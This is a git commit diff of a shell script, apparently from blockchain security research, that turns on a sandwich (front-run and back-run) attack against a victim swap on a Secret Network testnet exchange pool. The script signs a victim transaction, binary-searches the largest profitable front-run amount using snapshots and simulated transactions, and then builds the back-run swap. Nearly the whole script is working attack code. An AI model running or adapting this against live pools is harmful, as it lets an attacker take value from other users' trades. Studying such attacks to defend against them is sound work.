1498546a0de93418059e33fee1b984feeea338cc
lilione <lilioneviola@gmail.com>
2023-02-02 16:26:58 -0600

    debug

--- hacking/scripts/run_mev_demo_sienna_swap_testnet.sh
+++ hacking/scripts/run_mev_demo_sienna_swap_testnet.sh
@@ -1,29 +1,50 @@
 #!/bin/bash
 
 set -e
-#set -x
+set -x
 
-SECRETD=./secretd
-USR=secret15vya8x6l5qcf0xw28xwehjxd9stymtvf4sqr6q
+CHAIN_ID=pulsar-2
 
 #exchange_addr=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl
 CONTRACT_ADDRESS=secret1pak8feexy97myp22pjkxmsp5p8dmlkp4mkfxsl
 
 SHD_ADDR=secret19ymc8uq799zf36wjsgu4t0pk8euddxtx5fggn8 ### token_0
-sSCRT_ADDR=secret18vd8fpwxzck93qlwghaj6arh4p7c5n8978vsyg ### token_1
+sSCRT_ADDR=secret18vd8fpwxzck93qlwghaj6arh4p7c5n8978vsyg ### token_1'
 
+wait_for_tx() {
+  set +e
+  set +x
+  TX=""
+  while [ "$TX" == "" ]; do
+    sleep 1
+    TX=$($SECRETD q tx $1)
+  done
+  set -e
+  set -x
+}
 
-source ./scripts/demo_utils.sh
+generate_and_sign_tx() {
+  $SECRETD tx compute execute $CONTRACT_ADDRESS --generate-only $1 --from $2 --enclave-key io-master-key.txt --code-hash $CODE_HASH --label $UNIQUE_LABEL -y --broadcast-mode sync > tx_$3.json
+  echo $PASSPHRASE | $SECRETD tx sign tx_$3.json --chain-id $CHAIN_ID --from $2 --keyring-backend file -y > tx_$3_sign.json
+}
+
+broadcast_tx() {
+  TX=$(echo $PASSPHRASE | $SECRETD tx broadcast tx_$1_sign.json --from $ADMIN --keyring-backend file -y)
+  eval TX_HASH=$(echo $TX | jq .txhash )
+  wait_for_tx $TX_HASH
+}
 
 deposit_sSCRT() { ### turn SCRT to sSCRT
   TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $sSCRT_ADDR "{\"deposit\": {}}" --from $1 --amount=$2 -y)
-  wait_for_tx $TX
+  eval TX_HASH=$(echo $TX | jq .txhash )
+  wait_for_tx $TX_HASH
 }
 
 set_snip_20_viewing_key() {
   viewing_key=vk
   TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $1 "{\"set_viewing_key\": {\"key\":\"$viewing_key\"}}" --from $2 -y)
-  wait_for_tx $TX
+  eval TX_HASH=$(echo $TX | jq .txhash )
+  wait_for_tx $TX_HASH
 }
 
 query_snip_20_balance() {
@@ -35,7 +56,8 @@ query_snip_20_balance() {
 swap_sSCRT_to_SHD() {
   msg=$(echo -n "{\"swap\":{\"to\":\"$2\",\"expected_return\":\"$3\"}}" | base64 -w0)
   TX=$(echo $PASSPHRASE | $SECRETD tx compute execute $sSCRT_ADDR "{\"send\": {\"amount\":\"$1\",\"recipient\":\"$exchange_addr\",\"msg\":\"$msg\"}}" --gas 3000000 --from $USER --keyring-backend file -y)
-  wait_for_tx $TX
+  eval TX_HASH=$(echo $TX | jq .txhash )
+  wait_for_tx $TX_HASH
 }
 
 query_pool() {
@@ -58,8 +80,6 @@ query_balances() {
   echo "sSCRT_ADDR VICTIM $(query_snip_20_balance $sSCRT_ADDR $VICTIM)"
   echo "SHD_ADDR ADV $(query_snip_20_balance $SHD_ADDR $ADV)"
   echo "sSCRT_ADDR ADV $(query_snip_20_balance $sSCRT_ADDR $ADV)"
-#  echo "SHD_ADDR USR $(query_snip_20_balance $SHD_ADDR $USR)"
-#  echo "sSCRT_ADDR USR $(query_snip_20_balance $sSCRT_ADDR $USR)"
 }
 
 set_viewing_keys() {
@@ -69,65 +89,66 @@ set_viewing_keys() {
   set_snip_20_viewing_key $sSCRT_ADDR $ADV
 }
 
-#deposit_sSCRT $ADV 1000000uscrt
-#deposit_sSCRT $VICTIM 1000000uscrt
+deposit_sSCRT $ADV 1000000uscrt
+deposit_sSCRT $VICTIM 1000000uscrt
 
-#query_pools
+query_pools
 query_balances
-#
-## make victim tx
-#generate_and_sign_swap $sSCRT_ADDR 10 20 $VICTIM victim
-#echo "victim tx $sSCRT 10 20"
-#echo
-#
-#cnt=0
-#lo=0
-#hi=100
-#while [ $(expr $hi - $lo) -ne 1 ]; do
-#  set_snapshot "${UNIQUE_LABEL}-${cnt}"
-#
-#  mid=$((($hi + $lo) / 2))
-#  echo "lo:$lo hi:$hi mid:$mid"
-#
-#  generate_and_sign_swap $sSCRT_ADDR $mid 0 $ADV adv
-#  echo "adv tx token_a $mid 0"
-#
-#  simulate_tx adv
-#  old_pool_a=$(query_pool amount_1)
-#  simulate_tx victim
-#  new_pool_a=$(query_pool amount_1)
-#  dif_pool_a=$(($new_pool_a - $old_pool_a))
-#  echo 'dif' $dif_pool_a
-#
-#  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
-#  cnt=$((cnt + 1))
-#  echo "=================================== end of a trial"
-#  echo
-#done
-#
-#set_snapshot "${UNIQUE_LABEL}-${cnt}"
-#echo "final front-run tx token_a $lo 0"
-#old_pool_b=$(query_pool amount_0)
-#simulate_tx adv
-#new_pool_b=$(query_pool amount_0)
-#dif_pool_b=$(($old_pool_b - $new_pool_b))
-#generate_and_sign_swap $SHD_ADDR $dif_pool_b 0 $ADV adv_back
-#echo "final back-run tx token_b $dif_pool_b 0"
-#
-#echo
+
+# make victim tx
+generate_and_sign_swap $sSCRT_ADDR 10 20 $VICTIM victim
+echo "victim tx $sSCRT 10 20"
+echo
+
+cnt=0
+lo=0
+hi=100
+
+while [ $(expr $hi - $lo) -ne 1 ]; do
+  set_snapshot "${UNIQUE_LABEL}-${cnt}"
+
+  mid=$((($hi + $lo) / 2))
+  echo "lo:$lo hi:$hi mid:$mid"
+
+  generate_and_sign_swap $sSCRT_ADDR $mid 0 $ADV adv
+  echo "adv tx token_a $mid 0"
+
+  simulate_tx adv
+  old_pool_a=$(query_pool amount_1)
+  simulate_tx victim
+  new_pool_a=$(query_pool amount_1)
+  dif_pool_a=$(($new_pool_a - $old_pool_a))
+  echo 'dif' $dif_pool_a
+
+  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
+  cnt=$((cnt + 1))
+  echo "=================================== end of a trial"
+  echo
+done
+
+set_snapshot "${UNIQUE_LABEL}-${cnt}"
+echo "final front-run tx token_a $lo 0"
+old_pool_b=$(query_pool amount_0)
+simulate_tx adv
+new_pool_b=$(query_pool amount_0)
+dif_pool_b=$(($old_pool_b - $new_pool_b))
+generate_and_sign_swap $SHD_ADDR $dif_pool_b 0 $ADV adv_back
+echo "final back-run tx token_b $dif_pool_b 0"
+
+echo
+# broadcast all 3 txs
+set_snapshot "${UNIQUE_LABEL}-final"
+simulate_tx adv
+simulate_tx victim
+simulate_tx adv_back
+
 ## broadcast all 3 txs
-#set_snapshot "${UNIQUE_LABEL}-final"
-#simulate_tx adv
-#simulate_tx victim
-#simulate_tx adv_back
-#
-### broadcast all 3 txs
-##reset_snapshot
-##broadcast_tx adv
-##broadcast_tx victim
-### send back-run tx
-##execute_tx token_b $dif_pool_b 0 $ADV
-#
-#query_pools
-#query_balances
+#reset_snapshot
+#broadcast_tx adv
+#broadcast_tx victim
+## send back-run tx
+#execute_tx token_b $dif_pool_b 0 $ADV
+
+query_pools
+query_balances
 
